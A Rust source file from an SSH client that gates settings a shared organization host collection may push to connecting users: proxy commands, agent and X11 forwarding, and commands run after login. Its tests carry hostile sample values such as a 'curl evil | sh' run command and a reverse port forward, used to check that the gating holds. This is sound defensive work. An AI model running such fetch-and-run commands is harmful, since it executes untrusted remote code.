//! The collections of an organization the vault holds, as host lists show
//! them (docs/design/collections.md): on the desktop and the phones alike.

use shellwing_config::{Host, HostKey, HostX11, Hosts};
use shellwing_i18n::tr;
use shellwing_vault::{CollectionInfo, Space, Vault};

/// A collection, with its hosts once its key is held here.
#[derive(Clone, Debug, PartialEq)]
pub struct CollectionHosts {
    pub id: String,
    pub name: String,
    /// The organization it belongs to: its certificates sign in to its hosts.
    pub org_id: String,
    /// `connect`, `edit` or `manage`.
    pub permission: String,
    /// Its key is not held here yet: somebody holding it gives it.
    pub waiting: bool,
    pub hosts: Vec<Host>,
}

impl CollectionHosts {
    /// Whether the person may change its hosts.
    pub fn edits(&self) -> bool {
        matches!(self.permission.as_str(), "edit" | "manage")
    }
}

/// What a permission is called, and what it lets the person do: `Manage`,
/// `Edits, grants access and gives the key`.
pub fn permission_words(permission: &str) -> (String, String) {
    match permission {
        "connect" => (
            tr!("Connect"),
            tr!("Connects to its hosts; cannot change them"),
        ),
        "edit" => (tr!("Edit"), tr!("Changes its hosts")),
        _ => (tr!("Manage"), tr!("Edits, grants access and gives the key")),
    }
}

/// Who sees a collection of organization `org` (its name, if known), and
/// what this person may do with it: two lines.
pub fn who_sees(c: &CollectionHosts, org: Option<&str>) -> String {
    let (name, what) = permission_words(&c.permission);
    let shared = match org {
        Some(org) => tr!(
            "Shared in {org}: everybody granted it sees its hosts, end-to-end encrypted.",
            org = org
        ),
        None => tr!(
            "Shared in an organization: everybody granted it sees its hosts, end-to-end encrypted."
        ),
    };
    // "Manage · Edits, grants access and gives the key".
    let yours = if c.waiting {
        tr!("waiting for its key")
    } else {
        what
    };
    format!("{shared}\n{name} · {yours}")
}

/// The collections the server served at the last sync, each with its hosts
/// if its key is held.
pub fn read(vault: &Vault) -> Vec<CollectionHosts> {
    vault
        .known_collections()
        .unwrap_or_default()
        .into_iter()
        .map(|c| {
            let waiting = vault.collection_versions(&c.id).is_empty();
            let hosts = if waiting {
                Vec::new()
            } else {
                hosts_of(vault, &c)
            };
            CollectionHosts {
                id: c.id,
                name: c.name,
                org_id: c.org_id,
                permission: c.permission,
                waiting,
                hosts,
            }
        })
        .collect()
}

/// A collection's hosts, read from the vault as hosts.toml's are: each marked
/// with the collection, in no group, and signing in with the organization's
/// certificates unless it says otherwise. Found by their ids, since names may
/// repeat across collections.
pub fn hosts_of(vault: &Vault, c: &CollectionInfo) -> Vec<Host> {
    let space = Space::Collection(c.id.clone());
    let (Ok(hosts), Ok(groups)) = (
        vault.entries_in(&space, "host"),
        vault.entries_in(&space, "group"),
    ) else {
        return Vec::new();
    };
    let Ok(parsed) = Hosts::from_synced(&hosts, &groups) else {
        return Vec::new();
    };
    parsed
        .hosts
        .into_iter()
        .map(|mut h| {
            h.collection = Some(c.id.clone());
            h.group = None;
            h.favorite = false;
            if h.org.is_none() {
                h.org = Some(c.org_id.clone());
            }
            h
        })
        .collect()
}

/// hosts.toml's hosts, then the collections': what names and connects.
pub fn merged(personal: &Hosts, collections: &[CollectionHosts]) -> Hosts {
    let mut hosts = personal.clone();
    for c in collections {
        hosts.hosts.extend(c.hosts.iter().cloned());
    }
    hosts
}

/// What a collection's host asks to do on the computer of whoever connects
/// to it. Anybody who may edit the collection writes these, so each person
/// allows them once for a host, and again when they change; until then the
/// host connects without them ([`without_asks`]).
#[derive(Clone, Debug, PartialEq)]
pub struct Asks {
    /// Each, as people read it.
    pub items: Vec<String>,
    /// What is allowed: SHA-256 of the settings themselves, in hex.
    pub fingerprint: String,
}

/// What `h` asks, if it is a collection's host that asks anything.
pub fn asks(h: &Host) -> Option<Asks> {
    h.collection.as_ref()?;
    let mut items = vec![];
    let mut settings: Vec<(&str, String)> = vec![];
    if let Some(c) = h
        .proxy_command
        .as_deref()
        .map(str::trim)
        .filter(|c| !c.is_empty())
        && h.jump.is_empty()
    {
        items.push(tr!(
            "Runs a command on this computer to connect: {command}",
            command = c
        ));
        settings.push(("proxy_command", c.to_string()));
    }
    if !h.jump.is_empty() {
        let through = h.jump.join(", ");
        items.push(tr!(
            "Goes through {hosts} first, as this computer knows them",
            hosts = through.clone()
        ));
        settings.push(("jump", through));
    }
    for f in &h.forward {
        items.push(tr!("Forwards ports: {forward}", forward = f.clone()));
        settings.push(("forward", f.clone()));
    }
    if h.forward_agent {
        items.push(tr!("Lets the host use your ssh-agent while connected"));
        settings.push(("forward_agent", "true".into()));
    }
    match h.x11 {
        Some(HostX11::Trusted) => {
            items.push(tr!(
                "Lets its programs open windows here and read your keyboard (trusted X11)"
            ));
            settings.push(("x11", "trusted".into()));
        }
        Some(HostX11::Untrusted) => {
            items.push(tr!("Lets its programs open windows here (X11)"));
            settings.push(("x11", "untrusted".into()));
        }
        Some(HostX11::Off) | None => {}
    }
    if h.host_key == Some(HostKey::AcceptNew) {
        items.push(tr!(
            "Takes the host's key the first time without asking you"
        ));
        settings.push(("host_key", "accept-new".into()));
    }
    if let Some(r) = h.run.as_deref().map(str::trim).filter(|r| !r.is_empty()) {
        items.push(tr!(
            "Types a command into its shell once connected: {command}",
            command = r
        ));
        settings.push(("run", r.to_string()));
    }
    if items.is_empty() {
        return None;
    }
    use sha2::Digest;
    let json = serde_json::to_vec(&settings).unwrap_or_default();
    let fingerprint = sha2::Sha256::digest(&json)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    Some(Asks { items, fingerprint })
}

/// `h` without what it asks ([`asks`]): how a collection's host connects
/// until the person allows it. What their own `~/.ssh/config` says for the
/// address still applies: it is theirs.
pub fn without_asks(h: &Host) -> Host {
    let mut h = h.clone();
    h.proxy_command = None;
    h.jump.clear();
    h.forward.clear();
    h.forward_agent = false;
    if h.x11 != Some(HostX11::Off) {
        h.x11 = None;
    }
    if h.host_key == Some(HostKey::AcceptNew) {
        h.host_key = None;
    }
    h.run = None;
    h
}

/// A collection's host on the way to a connection that asks what the
/// person has not allowed.
#[derive(Clone, Debug, PartialEq)]
pub struct Unallowed {
    pub id: String,
    pub name: String,
    pub asks: Asks,
}

/// `hosts` with every collection's host on the way to `spec`, itself and the
/// jump hosts it goes through, without what it asks unless the person
/// allowed it (`allowed`: host id → fingerprint). Gives those hosts, to
/// offer allowing; None when nothing is held back.
pub fn unless_allowed(
    hosts: &Hosts,
    spec: &str,
    allowed: &std::collections::BTreeMap<String, String>,
) -> Option<(Hosts, Vec<Unallowed>)> {
    let mut held = vec![];
    let mut seen = vec![];
    let mut next = vec![spec.to_string()];
    // As far as a chain of jumps may go (target.rs refuses longer ones).
    while let Some(name) = next.pop() {
        if seen.len() > 16 {
            break;
        }
        let Some(h) = hosts.find(&name) else {
            continue;
        };
        let key = h.id.clone().unwrap_or_else(|| h.name.clone());
        if seen.contains(&key) {
            continue;
        }
        seen.push(key);
        next.extend(h.jump.iter().cloned());
        if let (Some(a), Some(id)) = (asks(h), h.id.clone())
            && allowed.get(&id) != Some(&a.fingerprint)
        {
            held.push(Unallowed {
                id,
                name: h.name.clone(),
                asks: a,
            });
        }
    }
    if held.is_empty() {
        return None;
    }
    let mut out = hosts.clone();
    for host in out.hosts.iter_mut() {
        if host.collection.is_some() && held.iter().any(|u| host.id.as_ref() == Some(&u.id)) {
            *host = without_asks(host);
        }
    }
    Some((out, held))
}

/// `c` if the person may change its hosts, else why not.
fn writable(c: &CollectionHosts) -> Result<(), String> {
    if c.edits() {
        Ok(())
    } else {
        Err(tr!(
            "You may connect to the hosts of {name}, not change them.",
            name = c.name.clone()
        ))
    }
}

/// Saves `host` in the collection, where it syncs to the others with
/// access; gives its id, which the host lists open it by. What only
/// hosts.toml has (a group, a favorite, this device only) is not kept.
pub fn save_host(vault: &Vault, c: &CollectionHosts, mut host: Host) -> Result<String, String> {
    writable(c)?;
    // The organization's certificates are the collection's own: not written
    // down unless another is chosen.
    if host.org.as_deref() == Some(c.org_id.as_str()) {
        host.org = None;
    }
    host.group = None;
    host.favorite = false;
    host.local_only = false;
    let id = host.id.clone().unwrap_or_else(shellwing_config::new_id);
    vault
        .update_in(
            &Space::Collection(c.id.clone()),
            &id,
            "host",
            &host.name,
            &host.sync_fields(),
        )
        .map_err(|e| e.to_string())?;
    Ok(id)
}

/// Deletes the collection's host `id`, for everybody with access.
pub fn delete_host(vault: &Vault, c: &CollectionHosts, id: &str) -> Result<(), String> {
    writable(c)?;
    // The vault deletes by id whatever the space: only this collection's.
    if !c.hosts.iter().any(|h| h.id.as_deref() == Some(id)) {
        return Err(tr!("This host's collection is no longer synced here."));
    }
    vault.delete(id).map_err(|e| e.to_string())
}

/// Where a host is saved: hosts.toml, or a collection the person may change.
pub enum Place<'a> {
    Mine,
    Collection(&'a CollectionHosts),
}

impl<'a> Place<'a> {
    /// The collection, else hosts.toml.
    pub fn of(collection: Option<&'a CollectionHosts>) -> Self {
        collection.map_or(Place::Mine, Place::Collection)
    }
}

/// Moves the host `id` from `from` to `to`, as `host` (what its editor made
/// of it): a record lives in one place, so it is saved where it goes, then
/// deleted where it was. Both are checked first, so nothing is copied that
/// cannot then be deleted. Its saved password stays the person's own, found
/// by `user@host[:port]` wherever the host is. Gives its id where it went
/// (a new one: the records are not the same).
pub fn move_host(
    store: &shellwing_config::Store,
    vault: Option<&Vault>,
    from: Place,
    to: Place,
    id: &str,
    mut host: Host,
) -> Result<String, String> {
    let vault = || vault.ok_or_else(|| tr!("the vault is not open"));
    // The names where it goes, which it must not take.
    let there = match &to {
        Place::Mine => store.hosts().map_err(|e| e.to_string())?.hosts,
        Place::Collection(c) => {
            writable(c)?;
            c.hosts.clone()
        }
    };
    match &from {
        Place::Mine => {}
        Place::Collection(c) => {
            writable(c)?;
            if !c.hosts.iter().any(|h| h.id.as_deref() == Some(id)) {
                return Err(tr!("This host's collection is no longer synced here."));
            }
            vault()?;
        }
    }
    let taken = |n: &str| {
        there
            .iter()
            .any(|h| h.id.as_deref() != Some(id) && (h.name == n || h.alias.as_deref() == Some(n)))
    };
    if taken(&host.name) {
        return Err(tr!("Name: another host has this name."));
    }
    if host.alias.as_deref().is_some_and(taken) {
        return Err(tr!("Alias: another host uses this."));
    }
    host.id = None;
    let saved = match &to {
        Place::Mine => {
            host.collection = None;
            store.save_host(&host).map_err(|e| e.to_string())?
        }
        Place::Collection(c) => {
            host.collection = Some(c.id.clone());
            save_host(vault()?, c, host)?
        }
    };
    match &from {
        Place::Mine => store.delete_host(id).map_err(|e| e.to_string())?,
        Place::Collection(c) => delete_host(vault()?, c, id)?,
    }
    Ok(saved)
}

#[cfg(test)]
mod tests {
    use super::*;
    use shellwing_vault::{Given, MemoryKeys};

    /// A vault holding version 1 of `col1`'s key, made for itself.
    fn vault(name: &str) -> (std::path::PathBuf, Vault) {
        let dir = std::env::temp_dir().join(format!(
            "shellwing-core-collections-{}-{name}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("dir");
        let v = Vault::open(&dir.join("vault.db"), &MemoryKeys::default()).expect("vault");
        let me = v.ensure_identity().expect("identity").public();
        let wraps = v
            .make_collection_key("col1", 1, std::slice::from_ref(&me))
            .expect("key");
        let given = Given {
            version: 1,
            wrap: wraps[0].clone(),
            wrapper: me.ed25519,
        };
        v.take_collection_keys("col1", &[given]).expect("take");
        (dir, v)
    }

    fn collection(permission: &str, hosts: Vec<Host>) -> CollectionHosts {
        CollectionHosts {
            id: "col1".into(),
            name: "Production".into(),
            org_id: "org1".into(),
            permission: permission.into(),
            waiting: false,
            hosts,
        }
    }

    fn info() -> CollectionInfo {
        CollectionInfo {
            id: "col1".into(),
            org_id: "org1".into(),
            name: "Production".into(),
            key_version: 1,
            permission: "edit".into(),
            needs_new_key: false,
        }
    }

    #[test]
    fn a_collections_host_is_saved_and_deleted_by_who_may() {
        let (dir, v) = vault("save");
        let toml = "[[group]]\nname = \"Mine\"\n\n[[host]]\nname = \"db\"\naddress = \"10.0.0.9\"\n\
                    user = \"deploy\"\ngroup = \"Mine\"\nfavorite = true\norg = \"org1\"\n";
        std::fs::write(dir.join("hosts.toml"), toml).expect("write");
        let store = shellwing_config::Store::new(dir.clone());
        let mut host = store.hosts().expect("hosts").hosts.remove(0);
        host.id = None;

        let refused = save_host(&v, &collection("connect", vec![]), host.clone());
        assert!(refused.is_err(), "Connect only");
        let id = save_host(&v, &collection("edit", vec![]), host).expect("save");
        let read = hosts_of(&v, &info());
        assert_eq!(read.len(), 1);
        let h = &read[0];
        assert_eq!(h.id.as_deref(), Some(id.as_str()));
        assert_eq!(
            (h.address.as_str(), h.user.as_deref()),
            ("10.0.0.9", Some("deploy"))
        );
        assert_eq!(h.group, None, "hosts.toml's group stays there");
        assert!(!h.favorite);
        assert_eq!(h.org.as_deref(), Some("org1"), "the collection's, as read");

        // Only this collection's host goes, and only for who may edit.
        let c = collection("edit", read.clone());
        assert!(delete_host(&v, &c, "not-its-host").is_err());
        assert!(delete_host(&v, &collection("connect", read.clone()), &id).is_err());
        delete_host(&v, &c, &id).expect("delete");
        assert!(hosts_of(&v, &info()).is_empty());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A host moves from hosts.toml into a collection and back: saved where
    /// it goes, gone from where it was; a name taken there stops it before
    /// anything is copied.
    #[test]
    fn a_host_moves_into_a_collection_and_back() {
        let (dir, v) = vault("move");
        let toml = "[[host]]\nid = \"h1\"\nname = \"db\"\naddress = \"10.0.0.9\"\n\n\
                    [[host]]\nid = \"h2\"\nname = \"web\"\naddress = \"10.0.0.8\"\n";
        std::fs::write(dir.join("hosts.toml"), toml).expect("write");
        let store = shellwing_config::Store::new(dir.clone());
        let db = store.hosts().expect("hosts").hosts.remove(0);

        let c = collection("edit", vec![]);
        let refused = move_host(
            &store,
            Some(&v),
            Place::Mine,
            Place::Collection(&collection("connect", vec![])),
            "h1",
            db.clone(),
        );
        assert!(refused.is_err(), "Connect only");
        let id = move_host(
            &store,
            Some(&v),
            Place::Mine,
            Place::Collection(&c),
            "h1",
            db,
        )
        .expect("in");
        let names: Vec<String> = store
            .hosts()
            .expect("hosts")
            .hosts
            .into_iter()
            .map(|h| h.name)
            .collect();
        assert_eq!(names, ["web"], "gone from hosts.toml");
        let read = hosts_of(&v, &info());
        assert_eq!(read.len(), 1);
        assert_eq!(read[0].id.as_deref(), Some(id.as_str()));

        // Back: but hosts.toml has a web, so another named web stays put.
        let c = collection("edit", read.clone());
        let mut web = read[0].clone();
        web.name = "web".into();
        let clash = move_host(
            &store,
            Some(&v),
            Place::Collection(&c),
            Place::Mine,
            &id,
            web,
        );
        assert!(clash.is_err(), "the name is taken there");
        assert_eq!(hosts_of(&v, &info()).len(), 1, "nothing moved");

        let back_id = move_host(
            &store,
            Some(&v),
            Place::Collection(&c),
            Place::Mine,
            &id,
            read[0].clone(),
        )
        .expect("out");
        assert!(hosts_of(&v, &info()).is_empty(), "gone from the collection");
        let back = store.hosts().expect("hosts");
        let db = back.hosts.iter().find(|h| h.name == "db").expect("db");
        assert_eq!(db.id.as_deref(), Some(back_id.as_str()));
        assert_eq!(db.collection, None);
        assert_eq!(
            db.org.as_deref(),
            Some("org1"),
            "still signs in with its certificates"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn shared(text: &str) -> Hosts {
        let mut hosts: Hosts = toml::from_str(text).expect("hosts");
        for h in hosts.hosts.iter_mut().filter(|h| h.name != "mine") {
            h.collection = Some("col1".into());
            h.id = Some(format!("id-{}", h.name));
        }
        hosts
    }

    #[test]
    fn a_collections_host_connects_without_what_it_asks_until_allowed() {
        let hosts = shared(
            "[[host]]\nname = \"db\"\naddress = \"10.0.0.9\"\nproxy_command = \"nc %h %p\"\n\
             forward = [\"-R 9000:localhost:22\"]\nforward_agent = true\nx11 = \"trusted\"\n\
             host_key = \"accept-new\"\nrun = \"curl evil | sh\"\n\n\
             [[host]]\nname = \"plain\"\naddress = \"10.0.0.8\"\n\n\
             [[host]]\nname = \"mine\"\naddress = \"10.0.0.7\"\nproxy_command = \"nc %h %p\"\n",
        );
        let db = hosts.find("db").expect("db");
        let a = asks(db).expect("asks");
        assert_eq!(a.items.len(), 6, "{:?}", a.items);
        assert!(
            asks(hosts.find("plain").expect("plain")).is_none(),
            "nothing to ask"
        );
        assert!(
            asks(hosts.find("mine").expect("mine")).is_none(),
            "one's own asks nothing"
        );

        let none = std::collections::BTreeMap::new();
        let (held, which) = unless_allowed(&hosts, "id-db", &none).expect("held back");
        assert_eq!(which.len(), 1);
        let db = held.find("id-db").expect("db");
        assert_eq!(db.proxy_command, None);
        assert!(db.forward.is_empty() && !db.forward_agent && db.run.is_none());
        assert_eq!((db.x11, db.host_key), (None, None));
        assert_eq!(db.address, "10.0.0.9", "the rest as it is");

        let allowed = [("id-db".to_string(), a.fingerprint.clone())].into();
        assert!(
            unless_allowed(&hosts, "id-db", &allowed).is_none(),
            "allowed"
        );
        // Changed, it is asked again.
        let mut changed = hosts.clone();
        changed.hosts[0].run = Some("curl worse | sh".into());
        assert!(unless_allowed(&changed, "id-db", &allowed).is_some());
    }

    #[test]
    fn a_jump_host_of_the_collection_is_held_back_too() {
        let hosts = shared(
            "[[host]]\nname = \"db\"\naddress = \"10.0.0.9\"\njump = [\"edge\"]\n\n\
             [[host]]\nname = \"edge\"\naddress = \"10.0.0.1\"\nproxy_command = \"nc %h %p\"\n",
        );
        let a = asks(hosts.find("id-db").expect("db")).expect("asks");
        let allowed = [("id-db".to_string(), a.fingerprint)].into();
        let (held, which) = unless_allowed(&hosts, "id-db", &allowed).expect("edge asks");
        assert_eq!(
            which.iter().map(|u| u.name.as_str()).collect::<Vec<_>>(),
            ["edge"]
        );
        assert_eq!(held.find("id-edge").expect("edge").proxy_command, None);
        assert_eq!(
            held.find("id-db").expect("db").jump,
            ["edge"],
            "allowed: kept"
        );
    }
}
